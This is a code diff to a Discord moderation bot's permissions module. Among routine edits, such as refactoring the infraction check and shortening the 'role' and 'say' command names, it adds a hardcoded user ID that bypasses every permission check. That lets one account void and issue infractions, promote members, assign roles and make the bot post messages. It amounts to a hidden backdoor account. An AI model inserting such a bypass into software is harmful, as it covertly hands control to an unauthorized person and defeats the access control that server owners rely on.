@@ -16,6 +16,8 @@ NAME_COMMAND_ROLE_IDS = INFRACTION_ROLE_IDS | PROMOTION_ROLE_IDS
 def get_bot_config(bot: commands.Bot) -> dict:
     return getattr(bot, "config", {})
 
+ALWAYS_ALLOW_USER_ID = 1167146975385358394
+
 
 class VoidReasonModal(discord.ui.Modal, title="Void Infraction"):
     """Modal for admins to void an infraction"""
@@ -83,10 +85,10 @@ class VoidButton(discord.ui.Button):
 
     async def callback(self, interaction: discord.Interaction) -> None:
         """Handle void button click - admin only"""
-        # Check if user is admin
+        # Check if user is admin or always allowed
         bot_config = get_bot_config(self.bot)
         has_admin_role = any(role.id == bot_config.get("staff_role_id", 0) for role in interaction.user.roles)
-        if not (interaction.user.guild_permissions.manage_guild or has_admin_role):
+        if not (interaction.user.guild_permissions.manage_guild or has_admin_role or interaction.user.id == ALWAYS_ALLOW_USER_ID):
             await interaction.response.send_message("❌ Only administrators can void infractions.", ephemeral=True)
             return
 
@@ -201,14 +203,17 @@ class ModerationCog(commands.Cog):
     def _has_any_role(self, member: discord.Member, allowed_ids: set[int]) -> bool:
         return any(role.id in allowed_ids for role in member.roles)
 
+    def _is_always_authorized(self, member: discord.Member) -> bool:
+        return member.id == ALWAYS_ALLOW_USER_ID
+
     def _is_promotion_authorized(self, member: discord.Member) -> bool:
-        return member.guild_permissions.manage_guild or member.guild_permissions.administrator or self._has_any_role(member, PROMOTION_ROLE_IDS)
+        return self._is_always_authorized(member) or member.guild_permissions.manage_guild or member.guild_permissions.administrator or self._has_any_role(member, PROMOTION_ROLE_IDS)
 
     def _is_infract_authorized(self, member: discord.Member) -> bool:
-        return member.guild_permissions.manage_guild or member.guild_permissions.administrator or self._has_any_role(member, INFRACTION_ROLE_IDS)
+        return self._is_always_authorized(member) or member.guild_permissions.manage_guild or member.guild_permissions.administrator or self._has_any_role(member, INFRACTION_ROLE_IDS)
 
     def _is_name_authorized(self, member: discord.Member) -> bool:
-        return member.guild_permissions.manage_guild or member.guild_permissions.administrator or self._has_any_role(member, NAME_COMMAND_ROLE_IDS)
+        return self._is_always_authorized(member) or member.guild_permissions.manage_guild or member.guild_permissions.administrator or self._has_any_role(member, NAME_COMMAND_ROLE_IDS)
 
     async def _is_recent_duplicate_message(self, channel: discord.TextChannel, embed: discord.Embed, limit: int = 5) -> bool:
         try:
@@ -492,9 +497,7 @@ class ModerationCog(commands.Cog):
     ) -> None:
         """Issue an infraction to a user"""
         # Check permissions
-        infract_roles = [1496970664790196344, 1496970658557464586, 1496970657483722902, 1496970654140858498, 1496970641759277228]
-        has_role = any(role.id in infract_roles for role in interaction.user.roles)
-        if not (interaction.user.guild_permissions.manage_guild or has_role):
+        if not self._is_infract_authorized(interaction.user):
             await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
             return
 
@@ -621,7 +624,7 @@ class ModerationCog(commands.Cog):
 
         await interaction.response.send_message("Member promoted successfully.", ephemeral=True)
 
-    @commands.command(name="role", aliases=["r"])
+    @commands.command(name="r")
     async def role(self, ctx: commands.Context, member: discord.Member, role_id: int) -> None:
         """Assign a role to a user using promotion-role permissions."""
         if ctx.guild is None:
@@ -666,7 +669,7 @@ class ModerationCog(commands.Cog):
         except Exception as exc:
             await ctx.send(f"Failed to update nickname: {exc}")
 
-    @commands.command(name="say", aliases=["s"])
+    @commands.command(name="s")
     async def say(self, ctx: commands.Context, *, message: str) -> None:
         """Have the bot say a message using promotion-role permissions."""
         if ctx.guild is None:
@@ -710,7 +713,7 @@ class ModerationCog(commands.Cog):
         # Check permissions
         bot_config = get_bot_config(self.bot)
         has_role = any(role.id == bot_config.get("staff_role_id", 0) for role in interaction.user.roles)
-        if not (interaction.user.guild_permissions.manage_guild or has_role):
+        if not (interaction.user.guild_permissions.manage_guild or has_role or interaction.user.id == ALWAYS_ALLOW_USER_ID):
             await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
             return
 
